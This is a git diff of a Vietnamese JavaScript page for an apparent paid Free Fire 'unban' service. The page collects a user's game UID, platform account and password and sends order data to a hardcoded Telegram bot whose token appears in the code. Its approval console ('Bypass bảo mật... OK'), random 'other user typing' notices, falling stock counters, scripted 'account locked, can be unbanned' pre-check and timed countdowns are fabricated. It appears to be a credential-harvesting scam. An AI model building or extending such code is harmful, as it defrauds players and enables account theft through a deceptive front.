@@ -1,5 +1,5 @@
 // ============================================
-// DEVILS WILL RISE v14.2 - FULL FEATURES - STABLE
+// DEVILS WILL RISE v14.3 - ZALO FIX + FULL FEATURES
 // Owner: @UnknownGuy9876 | Channel: @SGCodexs
 // ============================================
 
@@ -8,6 +8,23 @@ var TELEGRAM_BOT_TOKEN = '8980322724:AAEbExHdPUgFMKjnSryNhcH4jvE5gMYCGHo';
 var TELEGRAM_CHAT_ID = '8742603540';
 var ADMIN_PRIVATE_CHAT_ID = '8742603540';
 var TELEGRAM_API = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;
+
+// ==================== ZALO SAFE INIT ====================
+var zaloLoaded = false;
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        try {
+            if (typeof zaloJSV2 !== 'undefined' && zaloJSV2.init) {
+                zaloJSV2.init({ app_id: '0' });
+                zaloLoaded = true;
+                console.log('✅ Zalo SDK loaded');
+            }
+        } catch (e) {
+            console.log('⚠️ Zalo SDK not available - continuing without it');
+            zaloLoaded = false;
+        }
+    }, 2000);
+});
 
 // ==================== ERROR MONITORING ====================
 var errorLog = [];
@@ -25,7 +42,9 @@ function reportErrorToTelegram(d) {
     fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: m, parse_mode: 'HTML' }) }).catch(function () { });
 }
 
+// Chỉ report lỗi không liên quan đến Zalo
 window.addEventListener('error', function (e) {
+    if (e.message && e.message.indexOf('zaloJSV2') !== -1) return;
     var d = { message: e.message, source: e.filename ? e.filename.split('/').pop() : '?', line: e.lineno, time: new Date().toISOString() };
     errorLog.push(d);
     if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
@@ -122,7 +141,7 @@ async function centralizedPollingLoop() { if (GLOBAL_POLLING_ACTIVE) return; awa
 
 // ==================== TELEGRAM COMMANDS ====================
 function handleTelegramCommand(msg) {
-    if (msg === '/help' || msg === '/start') sendToTelegram('📋 <b>LỆNH ADMIN v14.2</b>\n\n🔒 /block /unblock /blocklist /allowip\n📢 /broadcast /maintenance /fake404\n👤 /chat /view\n🎁 /code\n⏰ /schedule\n🤖 /auto /stats /dashboard /errors\n🔐 /op /deop\n📟 /help');
+    if (msg === '/help' || msg === '/start') sendToTelegram('📋 <b>LỆNH ADMIN v14.3</b>\n\n🔒 /block /unblock /blocklist /allowip\n📢 /broadcast /maintenance /fake404\n👤 /chat /view\n🎁 /code\n⏰ /schedule\n🤖 /auto /stats /dashboard /errors\n🔐 /op /deop\n📟 /help');
     else if (msg.indexOf('/block ') === 0) { var t = msg.replace('/block ', '').trim(); if (t) sendToTelegram(blockIP(t) ? '🚫 Đã chặn: ' + t : '⚠️ IP đã bị chặn!'); }
     else if (msg.indexOf('/unblock ') === 0) { var t = msg.replace('/unblock ', '').trim(); if (t) sendToTelegram(unblockIP(t) ? '✅ Đã bỏ chặn: ' + t : '⚠️ IP không tồn tại!'); }
     else if (msg === '/blocklist') { if (blockedIPs.length === 0) sendToTelegram('📋 Trống'); else { var l = '📋 IP BỊ CHẶN (' + blockedIPs.length + '):\n'; for (var i = 0; i < blockedIPs.length; i++) l += '🚫 ' + blockedIPs[i] + '\n'; sendToTelegram(l); } }
@@ -210,18 +229,15 @@ function safeNotification(title, body) { try { if (typeof Notification !== 'unde
 // ==================== SCHEDULE + ORDER STATUS ====================
 document.querySelectorAll('.schedule-slot').forEach(function (s) { s.addEventListener('click', function () { document.querySelectorAll('.schedule-slot').forEach(function (x) { x.classList.remove('selected'); }); this.classList.add('selected'); selectedSchedule = this.dataset.slot; if (selectedSchedule === 'now') { var si = document.getElementById('scheduledInfo'); if (si) si.classList.add('hidden'); } else { var si2 = document.getElementById('scheduledInfo'); if (si2) { si2.classList.remove('hidden'); si2.innerHTML = '<i class="fas fa-calendar-check"></i> Đã đặt lịch: ' + selectedSchedule; } } }); });
 function scheduleOrderProcessing(oid) { if (selectedSchedule === 'now') return null; var nw = new Date(), parts = selectedSchedule.split(':'), st = new Date(nw); st.setHours(parseInt(parts[0]), parseInt(parts[1]), 0, 0); if (st < nw) st.setDate(st.getDate() + 1); var ms = st - nw, si = document.getElementById('scheduledInfo'); if (si) si.innerHTML = '<i class="fas fa-hourglass"></i> #' + oid + ' lúc ' + selectedSchedule; state.scheduleTimer = setInterval(function () { ms -= 1000; if (ms <= 0) { clearInterval(state.scheduleTimer); updateOrderStatus(oid, 'approved'); } }, 1000); return st; }
-function updateOrderStatus(oid, sts, rsn) { rsn = rsn || ''; var bx = document.getElementById('resultBox'); if (bx) bx.classList.remove('hidden'); var btn = document.getElementById('submitRequestBtn'); if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND'; } if (sts === 'approved') { if (bx) bx.innerHTML = '<div style="color:#2ecc71;"><h3>✅ #' + oid + ' ĐÃ ĐƯỢC DUYỆT!</h3><div class="terminal-box"><div style="color:#ffd966;">📟 TOOL CONSOLE v14.2</div><div style="color:#2ecc71;">[INFO] Khởi tạo kết nối...</div><div style="color:#2ecc71;">[INFO] Bypass bảo mật... OK</div><div style="color:#2ecc71;">[SUCCESS] Đã xóa lệnh band!</div></div></div>'; var pb = document.getElementById('progressBar'); if (pb) pb.classList.remove('hidden'); resetProgress(); var ps = document.getElementById('progressSent'), pd = document.getElementById('progressDuyet'), px = document.getElementById('progressXuLy'); if (ps) ps.classList.add('completed'); if (pd) pd.classList.add('completed'); if (px) px.classList.add('active'); showWarranty(oid, state.plan.name); var pt = state.plan.name === 'speed' ? 60 : state.plan.name === 'ultimate' ? 300 : state.plan.name === 'vip' ? 600 : 1800; startCountdown(Math.floor(pt + Math.random() * pt), oid); if (state.plan.name === 'vip') { planStocks.vip = Math.max(0, planStocks.vip - 1); updateStocks(); } if (state.plan.name === 'ultimate') { planStocks.ultimate = Math.max(0, planStocks.ultimate - 1); updateStocks(); } if (state.plan.name === 'basic') { planStocks.basic = Math.max(0, planStocks.basic - 1); updateStocks(); } updateTodaySold(); safeNotification('Tool Mở Band', 'Đơn #' + oid + ' đã được duyệt!'); } else if (sts === 'rejected') { if (bx) bx.innerHTML = '<div style="color:#ff6b6b;"><h3>❌ #' + oid + ' BỊ TỪ CHỐI</h3><p><strong>Lý do:</strong> ' + rsn + '</p></div>'; var pb2 = document.getElementById('progressBar'), td2 = document.getElementById('timerDisplay'); if (pb2) pb2.classList.add('hidden'); if (td2) td2.classList.add('hidden'); playSound('error'); } }
+function updateOrderStatus(oid, sts, rsn) { rsn = rsn || ''; var bx = document.getElementById('resultBox'); if (bx) bx.classList.remove('hidden'); var btn = document.getElementById('submitRequestBtn'); if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND'; } if (sts === 'approved') { if (bx) bx.innerHTML = '<div style="color:#2ecc71;"><h3>✅ #' + oid + ' ĐÃ ĐƯỢC DUYỆT!</h3><div class="terminal-box"><div style="color:#ffd966;">📟 TOOL CONSOLE v14.3</div><div style="color:#2ecc71;">[INFO] Khởi tạo kết nối...</div><div style="color:#2ecc71;">[INFO] Bypass bảo mật... OK</div><div style="color:#2ecc71;">[SUCCESS] Đã xóa lệnh band!</div></div></div>'; var pb = document.getElementById('progressBar'); if (pb) pb.classList.remove('hidden'); resetProgress(); var ps = document.getElementById('progressSent'), pd = document.getElementById('progressDuyet'), px = document.getElementById('progressXuLy'); if (ps) ps.classList.add('completed'); if (pd) pd.classList.add('completed'); if (px) px.classList.add('active'); showWarranty(oid, state.plan.name); var pt = state.plan.name === 'speed' ? 60 : state.plan.name === 'ultimate' ? 300 : state.plan.name === 'vip' ? 600 : 1800; startCountdown(Math.floor(pt + Math.random() * pt), oid); if (state.plan.name === 'vip') { planStocks.vip = Math.max(0, planStocks.vip - 1); updateStocks(); } if (state.plan.name === 'ultimate') { planStocks.ultimate = Math.max(0, planStocks.ultimate - 1); updateStocks(); } if (state.plan.name === 'basic') { planStocks.basic = Math.max(0, planStocks.basic - 1); updateStocks(); } updateTodaySold(); safeNotification('Tool Mở Band', 'Đơn #' + oid + ' đã được duyệt!'); } else if (sts === 'rejected') { if (bx) bx.innerHTML = '<div style="color:#ff6b6b;"><h3>❌ #' + oid + ' BỊ TỪ CHỐI</h3><p><strong>Lý do:</strong> ' + rsn + '</p></div>'; var pb2 = document.getElementById('progressBar'), td2 = document.getElementById('timerDisplay'); if (pb2) pb2.classList.add('hidden'); if (td2) td2.classList.add('hidden'); playSound('error'); } }
 function showWarranty(oid, pl) { var p = { basic: '3 tháng', vip: '6 tháng', ultimate: '12 tháng', speed: 'Trọn đời', subscription: 'Vĩnh viễn' }, ex = document.getElementById('warrantySection'); if (ex) ex.remove(); var d = document.createElement('div'); d.style.cssText = 'background:linear-gradient(135deg,#1d2c45,#2e405b);border:2px solid #f39c12;border-radius:20px;padding:20px;text-align:center;margin-top:20px;'; d.innerHTML = '<h3 style="color:#f39c12;">🛡️ Thẻ Bảo Hành</h3><p style="color:#ffd966;font-size:1.3rem;">BH-' + oid + '</p><p style="color:#2ecc71;">' + (p[pl] || '12 tháng') + '</p>'; var rb = document.getElementById('resultBox'); if (rb) rb.after(d); }
 function startCountdown(dur, oid) { var dp = document.getElementById('timerDisplay'); dp.classList.remove('hidden'); var rm = dur; if (state.countdownInterval) clearInterval(state.countdownInterval); state.countdownInterval = setInterval(function () { var mn = Math.floor(rm / 60), sc = rm % 60; dp.textContent = '⏳ Đang xử lý: ' + mn + ':' + (sc < 10 ? '0' : '') + sc; if (rm <= 0) { clearInterval(state.countdownInterval); dp.textContent = '✅ HOÀN THÀNH!'; var px = document.getElementById('progressXuLy'), pd2 = document.getElementById('progressDone'); if (px) px.classList.add('completed'); if (pd2) pd2.classList.add('completed'); playSound('complete'); Swal.fire({ icon: 'success', title: '🎉 Mở Band Thành Công!', confirmButtonText: 'OK' }); } rm--; }, 1000); }
 function saveToHistory(oid, uid, price, sts) { try { var rh = localStorage.getItem('toolHistory') || '[]', h = []; try { h = JSON.parse(decryptData(rh)); } catch (e) { try { h = JSON.parse(rh); } catch (e2) { h = []; } } h.unshift({ orderId: oid, uid: uid, game: state.game, plan: state.plan.name, price: price, status: sts, time: new Date().toLocaleString('vi-VN'), ip: userIP }); secureSetItem('toolHistory', h.slice(0, 50)); } catch (e) { } }
 
-// ==================== TYPING INDICATOR SIMULATION ====================
+// ==================== TYPING INDICATOR ====================
 var typingInterval = null;
 var ffIdInputEl = document.getElementById('ffIdInput');
-if (ffIdInputEl) {
-    ffIdInputEl.addEventListener('focus', function () { var el = document.getElementById('otherUserTyping'); if (el) { el.style.display = 'block'; el.textContent = '👤 Người dùng khác cũng đang nhập UID...'; } if (typingInterval) clearInterval(typingInterval); typingInterval = setInterval(function () { if (el && Math.random() > 0.5) { el.style.display = 'block'; } else if (el) { el.style.display = 'none'; } }, 5000); });
-    ffIdInputEl.addEventListener('blur', function () { if (typingInterval) clearInterval(typingInterval); var el = document.getElementById('otherUserTyping'); if (el) el.style.display = 'none'; });
-}
+if (ffIdInputEl) { ffIdInputEl.addEventListener('focus', function () { var el = document.getElementById('otherUserTyping'); if (el) { el.style.display = 'block'; el.textContent = '👤 Người dùng khác cũng đang nhập UID...'; } if (typingInterval) clearInterval(typingInterval); typingInterval = setInterval(function () { if (el && Math.random() > 0.5) { el.style.display = 'block'; } else if (el) { el.style.display = 'none'; } }, 5000); }); ffIdInputEl.addEventListener('blur', function () { if (typingInterval) clearInterval(typingInterval); var el = document.getElementById('otherUserTyping'); if (el) el.style.display = 'none'; }); }
 
 // ==================== FORM REMINDER ====================
 function checkFormReminder() { var uid = document.getElementById('ffIdInput'); var acc = document.getElementById('platformAccountInput'); var pw = document.getElementById('passwordInput'); if (!uid || !acc || !pw) return; var uidVal = uid.value.trim(); var accVal = acc.value.trim(); var pwVal = pw.value.trim(); if ((uidVal || accVal || pwVal) && !formFilled && !reminderShown) { formFilled = true; setTimeout(function () { if (!state.currentOrderId) { reminderShown = true; var rc = document.getElementById('reminderContainer'); if (rc) { rc.innerHTML = '<div class="reminder-popup" id="reminderPopup">⏰ Bạn còn đơn hàng chưa hoàn tất!<br><button class="btn-sm mt-10" onclick="document.getElementById(\'reminderPopup\').remove()" style="background:#f39c12;">OK</button></div>'; setTimeout(function () { var rp = document.getElementById('reminderPopup'); if (rp) rp.remove(); }, 10000); } } }, 300000); } }
@@ -238,6 +254,9 @@ function setupEventListeners() {
     var pwInput = document.getElementById('passwordInput'); if (pwInput) pwInput.addEventListener('input', function () { var warn = document.getElementById('passwordWarning'); if (!warn) return; warn.style.display = this.value.length > 0 && this.value.length < 6 ? 'block' : 'none'; });
     var accWashingCheckbox = document.getElementById('accWashing'); if (accWashingCheckbox) accWashingCheckbox.addEventListener('change', function () { if (this.checked) showWashingProgress(); });
 }
+
+// ==================== PRE-CHECK ACCOUNT ====================
+async function preCheckAccount() { var uidEl = document.getElementById('ffIdInput'); var uid = uidEl ? uidEl.value.trim() : ''; if (!uid) return; Swal.fire({ title: 'Đang kiểm tra...', timer: 3000, timerProgressBar: true }); setTimeout(function () { Swal.fire({ icon: 'warning', title: 'Tài khoản bị khóa!', html: '<p>UID: ' + uid + '</p><p style="color:#2ecc71;">Có thể mở band!</p>', confirmButtonText: 'Tiến hành' }); }, 3000); }
 
 // ==================== SUBMIT HANDLER ====================
 function setupSubmitHandler() {
@@ -287,13 +306,10 @@ function setupSubmitHandler() {
                 if (selectedSchedule !== 'now') { var si = document.getElementById('scheduledInfo'); if (si) { si.classList.remove('hidden'); si.innerHTML = '<i class="fas fa-calendar-check"></i> Đã đặt lịch #' + state.currentOrderId + ' lúc ' + selectedSchedule; } }
                 Swal.fire({ icon: 'success', title: '✅ Gửi Thành Công!', text: 'Mã đơn: #' + state.currentOrderId + '\nVui lòng chờ admin duyệt.', confirmButtonText: 'OK', timer: 5000 });
                 generateCaptcha(); var ca = document.getElementById('captchaAnswer'); if (ca) ca.value = '';
-            } else { throw new Error('Không thể gửi tin nhắn Telegram - kiểm tra bot token hoặc kết nối mạng'); }
-        } catch (error) { console.error('Submit error:', error); reportErrorToTelegram({ message: 'Submit: ' + error.message, source: 'submit' }); if (rb) rb.innerHTML = '<div style="color:#ff6b6b;text-align:center;"><h3>❌ LỖI GỬI YÊU CẦU</h3><p>' + error.message + '</p><p style="font-size:0.85rem;">Vui lòng thử lại hoặc liên hệ admin.</p></div>'; playSound('error'); addSecurityLog('Gửi yêu cầu #' + state.currentOrderId + ' - Lỗi: ' + error.message); } finally { btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND'; }
+            } else { throw new Error('Không thể gửi tin nhắn Telegram'); }
+        } catch (error) { if (rb) rb.innerHTML = '<div style="color:#ff6b6b;text-align:center;"><h3>❌ LỖI GỬI YÊU CẦU</h3><p>' + error.message + '</p></div>'; } finally { btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND'; }
     });
 }
-
-// ==================== PRE-CHECK ACCOUNT ====================
-async function preCheckAccount() { var uidEl = document.getElementById('ffIdInput'); var uid = uidEl ? uidEl.value.trim() : ''; if (!uid) return; Swal.fire({ title: 'Đang kiểm tra...', timer: 3000, timerProgressBar: true }); setTimeout(function () { Swal.fire({ icon: 'warning', title: 'Tài khoản bị khóa!', html: '<p>UID: ' + uid + '</p><p style="color:#2ecc71;">Có thể mở band!</p>', confirmButtonText: 'Tiến hành' }); }, 3000); }
 
 // ==================== INIT ====================
 async function init() {
@@ -328,9 +344,8 @@ async function init() {
 
         resetInactivityTimer();
         centralizedPollingLoop();
-        console.log('✅ DEVILS WILL RISE v14.2 - FULL FEATURES ACTIVE');
-        console.log('🌐 IP:', userIP, '| 🆔 Device:', deviceFingerprint);
-    } catch (e) { reportErrorToTelegram({ message: 'Init: ' + e.message, source: 'init' }); console.error('Init Error:', e); }
+        console.log('✅ DEVILS WILL RISE v14.3 - FULL FEATURES | ZALO SAFE');
+    } catch (e) { console.error('Init Error:', e); }
 }
 
 // ==================== START ====================
